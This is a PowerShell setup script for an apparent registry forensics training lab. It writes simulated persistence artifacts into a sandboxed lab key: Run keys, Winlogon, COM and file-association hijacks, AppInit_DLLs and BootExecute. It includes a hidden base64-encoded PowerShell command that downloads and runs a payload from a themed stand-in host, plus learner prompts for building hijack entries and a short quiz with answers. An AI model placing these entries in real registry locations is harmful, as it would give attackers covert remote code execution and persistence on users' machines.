# create_artifacts.ps1
# Registry Forensics Lab: Tracking the Dark Kittens
# This script creates simulated malicious registry artifacts in the safe test area

Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "Registry Forensics: Tracking the Dark Kittens Lab by Angel Sayani" -ForegroundColor Cyan
Write-Host "Creating Simulated Malicious Registry Artifacts" -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host ""

# Verify PowerShell running as Administrator
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script must be run as Administrator. Please restart PowerShell as Administrator." -ForegroundColor Red
    exit
}

# Check if lab environment is set up
if (-not (Test-Path "HKCU:\Software\DarkKittensLab")) {
    Write-Host "Lab environment not found. Please run setup.ps1 first." -ForegroundColor Red
    exit
}

$artifactsPath = "HKCU:\Software\DarkKittensLab\Artifacts"
$configPath = "HKCU:\Software\DarkKittensLab\Configuration"
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Check detection sensitivity 
$detectionSensitivity = "Medium"
if (Test-Path $configPath) {
    $detectionSensitivity = (Get-ItemProperty -Path $configPath).DetectionSensitivity
}

Write-Host "Detection sensitivity set to: $detectionSensitivity" -ForegroundColor Yellow
Write-Host ""

Write-Host "Creating simulated malicious registry artifacts..." -ForegroundColor Yellow

# 1. Run Key Persistence
$runKeyPath = "$artifactsPath\RunKey"
New-Item -Path $runKeyPath -Force | Out-Null
New-ItemProperty -Path $runKeyPath -Name "GloboUpdater" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZABhAHIAawBrAGkAdAB0AGUAbgBzAC4AZQByAHYAZQBlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AdAB4AHQAJwApAA==" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $runKeyPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created Run key persistence artifact" -ForegroundColor Green

# LEARNER TASK: Add a custom run key
Write-Host ""
Write-Host "LEARNER TASK:" -ForegroundColor Magenta
Write-Host "Create your own malicious run key entry" -ForegroundColor Magenta
Write-Host "This simulates how an attacker might add multiple persistence mechanisms" -ForegroundColor Magenta
Write-Host ""
Write-Host "1. Type a name for your run key entry (e.g., 'SystemUpdate', 'BackgroundService')" -ForegroundColor White
$runKeyName = Read-Host "Run key name"

if ([string]::IsNullOrWhiteSpace($runKeyName)) {
    $runKeyName = "CustomUpdater"
    Write-Host "Using default name: $runKeyName" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "2. Choose the type of payload:" -ForegroundColor White
Write-Host "   1. PowerShell script" -ForegroundColor White
Write-Host "   2. Executable file" -ForegroundColor White
Write-Host "   3. Batch file" -ForegroundColor White
$payloadType = Read-Host "Enter choice (1-3)"

$runKeyValue = ""
switch ($payloadType) {
    "1" {
        $runKeyValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1"
    }
    "2" {
        $runKeyValue = "C:\ProgramData\Microsoft\Windows\malware.exe -silent"
    }
    "3" {
        $runKeyValue = "C:\Windows\System32\cmd.exe /c C:\Temp\startup.bat"
    }
    default {
        $runKeyValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1"
        Write-Host "Invalid choice. Using default PowerShell script payload." -ForegroundColor Yellow
    }
}

# Add the learner's custom run key
New-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runKeyValue -PropertyType String -Force | Out-Null
Write-Host "  [+] Added custom Run key entry: $runKeyName" -ForegroundColor Green
Write-Host "      Value: $runKeyValue" -ForegroundColor Green

# 2. WinLogon Helper DLL
$winlogonPath = "$artifactsPath\Winlogon"
New-Item -Path $winlogonPath -Force | Out-Null
New-ItemProperty -Path $winlogonPath -Name "Shell" -Value "explorer.exe" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $winlogonPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\ProgramData\svchost.dll" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $winlogonPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created WinLogon helper DLL artifact" -ForegroundColor Green

# 3. Service Creation
$servicePath = "$artifactsPath\Services\GloboSync"
New-Item -Path $servicePath -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "DisplayName" -Value "Globomantics Sync Service" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "ImagePath" -Value "%SystemRoot%\System32\svchost.exe -k netsvcs -p" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "Description" -Value "Provides file synchronization services for Globomantics" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "ObjectName" -Value "LocalSystem" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "Start" -Value 2 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "Type" -Value 16 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $servicePath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created malicious service artifact" -ForegroundColor Green

# 4. COM Object Hijacking
$comHijackPath = "$artifactsPath\COMHijack"
New-Item -Path $comHijackPath -Force | Out-Null
New-Item -Path "$comHijackPath\CLSID" -Force | Out-Null
New-Item -Path "$comHijackPath\CLSID\{00000000-0000-0000-C000-000000000046}" -Force | Out-Null
New-Item -Path "$comHijackPath\CLSID\{00000000-0000-0000-C000-000000000046}\InprocServer32" -Force | Out-Null
New-ItemProperty -Path "$comHijackPath\CLSID\{00000000-0000-0000-C000-000000000046}\InprocServer32" -Name "(Default)" -Value "C:\Windows\Tasks\updater.dll" -PropertyType String -Force | Out-Null
New-ItemProperty -Path "$comHijackPath\CLSID\{00000000-0000-0000-C000-000000000046}\InprocServer32" -Name "ThreadingModel" -Value "Both" -PropertyType String -Force | Out-Null
New-ItemProperty -Path "$comHijackPath\CLSID\{00000000-0000-0000-C000-000000000046}" -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created COM object hijacking artifact" -ForegroundColor Green

# 5. Scheduled Task Persistence
$scheduledTaskPath = "$artifactsPath\ScheduledTasks"
New-Item -Path $scheduledTaskPath -Force | Out-Null
New-ItemProperty -Path $scheduledTaskPath -Name "GloboBackup" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Backup\sync.ps1" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $scheduledTaskPath -Name "Schedule" -Value "Daily, 3:00 AM" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $scheduledTaskPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created scheduled task persistence artifact" -ForegroundColor Green

# 6. AppInit_DLLs Persistence
$appInitPath = "$artifactsPath\AppInit"
New-Item -Path $appInitPath -Force | Out-Null
New-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value "C:\Windows\System32\globomantics.dll" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $appInitPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created AppInit_DLLs persistence artifact" -ForegroundColor Green

# 7. Screensaver Persistence
$screensaverPath = "$artifactsPath\Screensaver"
New-Item -Path $screensaverPath -Force | Out-Null
New-ItemProperty -Path $screensaverPath -Name "SCRNSAVE.EXE" -Value "C:\Windows\Temp\globosaver.scr" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $screensaverPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created screensaver persistence artifact" -ForegroundColor Green

# 8. File Association Hijacking
$fileAssocPath = "$artifactsPath\FileAssoc"
New-Item -Path $fileAssocPath -Force | Out-Null
New-Item -Path "$fileAssocPath\.txt" -Force | Out-Null
New-Item -Path "$fileAssocPath\.txt\shell" -Force | Out-Null
New-Item -Path "$fileAssocPath\.txt\shell\open" -Force | Out-Null
New-Item -Path "$fileAssocPath\.txt\shell\open\command" -Force | Out-Null
New-ItemProperty -Path "$fileAssocPath\.txt\shell\open\command" -Name "(Default)" -Value "C:\Windows\System32\notepad.exe %1 & C:\Windows\Temp\logger.exe %1" -PropertyType String -Force | Out-Null
New-ItemProperty -Path "$fileAssocPath\.txt\shell\open\command" -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created file association hijacking artifact" -ForegroundColor Green

# LEARNER TASK: Create a file association hijack for another file type
Write-Host ""
Write-Host "LEARNER TASK:" -ForegroundColor Magenta
Write-Host "Create another file association hijack for a different file extension" -ForegroundColor Magenta
Write-Host "Attackers often target multiple file types to increase chances of execution" -ForegroundColor Magenta
Write-Host ""

$fileExtOptions = @(".docx", ".pdf", ".jpg", ".html", ".zip")
Write-Host "Choose a file extension to hijack:" -ForegroundColor White
for ($i = 0; $i -lt $fileExtOptions.Count; $i++) {
    Write-Host "  $($i+1). $($fileExtOptions[$i])" -ForegroundColor White
}
$extensionChoice = Read-Host "Enter your choice (1-5)"

$fileExtension = ".docx"  # Default
if ([int]::TryParse($extensionChoice, [ref]$null)) {
    $index = [int]$extensionChoice - 1
    if ($index -ge 0 -and $index -lt $fileExtOptions.Count) {
        $fileExtension = $fileExtOptions[$index]
    }
}

Write-Host ""
Write-Host "Now, enter a malicious command that will execute when a $fileExtension file is opened:" -ForegroundColor White
Write-Host "Examples:" -ForegroundColor White
Write-Host "- For .docx: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE %1 & C:\Windows\Temp\steal.exe %1'" -ForegroundColor White
Write-Host "- For .pdf: 'C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe %1 & C:\ProgramData\collect.exe'" -ForegroundColor White
$maliciousCommand = Read-Host "Enter command (or press Enter for default)"

if ([string]::IsNullOrWhiteSpace($maliciousCommand)) {
    $defaultCommands = @{
        ".docx" = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE %1 & C:\Windows\Temp\steal.exe %1"
        ".pdf" = "C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe %1 & C:\ProgramData\collect.exe"
        ".jpg" = "C:\Windows\System32\mspaint.exe %1 & C:\Users\Public\data.exe"
        ".html" = "C:\Program Files\Internet Explorer\iexplore.exe %1 & C:\Windows\Temp\keylog.exe"
        ".zip" = "C:\Program Files\Windows NT\Accessories\WORDPAD.EXE %1 & C:\Windows\backdoor.exe"
    }
    $maliciousCommand = $defaultCommands[$fileExtension]
    Write-Host "Using default command: $maliciousCommand" -ForegroundColor Yellow
}

# Create the learner's file association hijack
New-Item -Path "$fileAssocPath\$fileExtension" -Force | Out-Null
New-Item -Path "$fileAssocPath\$fileExtension\shell" -Force | Out-Null
New-Item -Path "$fileAssocPath\$fileExtension\shell\open" -Force | Out-Null
New-Item -Path "$fileAssocPath\$fileExtension\shell\open\command" -Force | Out-Null
New-ItemProperty -Path "$fileAssocPath\$fileExtension\shell\open\command" -Name "(Default)" -Value $maliciousCommand -PropertyType String -Force | Out-Null
New-ItemProperty -Path "$fileAssocPath\$fileExtension\shell\open\command" -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created custom file association hijack for $fileExtension files" -ForegroundColor Green
Write-Host "      Command: $maliciousCommand" -ForegroundColor Green

# 9. DLL Search Order Hijacking
$dllSearchPath = "$artifactsPath\DLLSearch"
New-Item -Path $dllSearchPath -Force | Out-Null
New-ItemProperty -Path $dllSearchPath -Name "PATH" -Value "C:\Temp;C:\Windows\System32;C:\Windows;C:\Windows\System32\wbem" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $dllSearchPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created DLL search order hijacking artifact" -ForegroundColor Green

# 10. Boot Execute
$bootExecPath = "$artifactsPath\BootExecute"
New-Item -Path $bootExecPath -Force | Out-Null
New-ItemProperty -Path $bootExecPath -Name "BootExecute" -Value "autocheck autochk * globocheck.exe" -PropertyType MultiString -Force | Out-Null
New-ItemProperty -Path $bootExecPath -Name "Timestamp" -Value $timestamp -PropertyType String -Force | Out-Null
Write-Host "  [+] Created boot execute persistence artifact" -ForegroundColor Green

# Create a timestamp marker for when the artifacts were created
New-ItemProperty -Path $artifactsPath -Name "InfectionTime" -Value $timestamp -PropertyType String -Force | Out-Null

# LEARNER TASK: Understanding Registry-Based Persistence Quiz
Write-Host ""
Write-Host "LEARNER TASK:" -ForegroundColor Magenta
Write-Host "Answer the following questions about registry-based persistence:" -ForegroundColor Magenta
Write-Host ""

$quizQuestions = @(
    @{
        Question = "Which registry key is most frequently used for persistence via auto-start execution?"
        Options = @("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKLM\SYSTEM\CurrentControlSet\Services", "HKLM\SOFTWARE\Classes", "HKLM\SYSTEM\CurrentControlSet\Control")
        CorrectAnswer = 1
    },
    @{
        Question = "What makes Base64 encoding suspicious in registry values?"
        Options = @("It's never legitimate in registry", "It often hides executable commands", "It's used only by malware", "It changes registry data type")
        CorrectAnswer = 2
    },
    @{
        Question = "Why do attackers use multiple persistence mechanisms?"
        Options = @("To increase system damage", "To better hide their presence", "To ensure persistence if one method is discovered and removed", "All of the above")
        CorrectAnswer = 3
    }
)

$userScore = 0
foreach ($q in $quizQuestions) {
    Write-Host $q.Question -ForegroundColor Yellow
    for ($i = 0; $i -lt $q.Options.Count; $i++) {
        Write-Host "  $($i+1). $($q.Options[$i])" -ForegroundColor White
    }
    
    $answer = Read-Host "Your answer (1-$($q.Options.Count))"
    if ($answer -eq $q.CorrectAnswer) {
        Write-Host "Correct!" -ForegroundColor Green
        $userScore++
    } else {
        Write-Host "Incorrect. The correct answer is $($q.CorrectAnswer): $($q.Options[$q.CorrectAnswer-1])" -ForegroundColor Red
    }
    Write-Host ""
}

Write-Host "Your Score: $userScore / $($quizQuestions.Count)" -ForegroundColor Yellow
Write-Host ""

# Save quiz results to a file
$quizResults = @"
Registry Forensics Lab Quiz Results
==================================
Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Score: $userScore / $($quizQuestions.Count)
"@

$quizResults | Out-File -FilePath "$env:USERPROFILE\Documents\RegistryForensicsLab\quiz_results.txt" -Force

Write-Host "All simulated malicious registry artifacts have been created." -ForegroundColor Green
Write-Host "You can now use forensic_tools.ps1 to begin your investigation." -ForegroundColor Cyan
Write-Host "Your quiz results have been saved to: $env:USERPROFILE\Documents\RegistryForensicsLab\quiz_results.txt" -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
